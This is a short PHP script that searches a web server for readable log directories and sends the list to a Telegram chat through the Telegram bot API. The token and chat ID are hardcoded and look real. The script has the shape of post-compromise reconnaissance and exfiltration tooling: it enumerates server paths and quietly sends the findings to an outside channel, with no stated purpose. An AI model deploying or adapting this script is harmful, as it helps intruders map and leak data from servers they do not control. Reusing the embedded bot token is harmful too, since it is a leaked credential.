<?php
// Telegram Bot Config
$botToken = "6526444701:AAE6QMmybK5ILO1ezNHgQepF1Lz5K63ui6o"; // Replace with your Telegram Bot Token
$chatId = "-1002080579579"; // Replace with your Telegram Chat ID

// Function to search for log directories
function find_log_dirs() {
    $potential_dirs = [
        "/var/log/", "/var/www/logs/", "/home/*/logs/", "/usr/local/apache/logs/", 
        "/usr/local/nginx/logs/", "/tmp/logs/", "/etc/logs/", getcwd() . "/logs/"
    ];
    
    $found_logs = [];
    foreach ($potential_dirs as $dir) {
        if (is_dir($dir) && is_readable($dir)) {
            $found_logs[] = realpath($dir);
        }
    }
    return $found_logs;
}

// Get log directories
$log_dirs = find_log_dirs();
$log_dirs_string = !empty($log_dirs) ? implode("\n", $log_dirs) : "No log directories found.";

// Prepare Telegram message
$message = "🔍 *Log Directory Search Result:*\n\n" . $log_dirs_string;
$telegramURL = "https://api.telegram.org/bot$botToken/sendMessage";

// Send to Telegram
$data = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

// Send request
$options = [
    'http' => [
        'header' => "Content-Type: application/x-www-form-urlencoded\r\n",
        'method' => 'POST',
        'content' => http_build_query($data),
    ]
];
$context = stream_context_create($options);
$response = file_get_contents($telegramURL, false, $context);

// Display a message
echo "Log directory search complete. Results sent to Telegram.";
?>
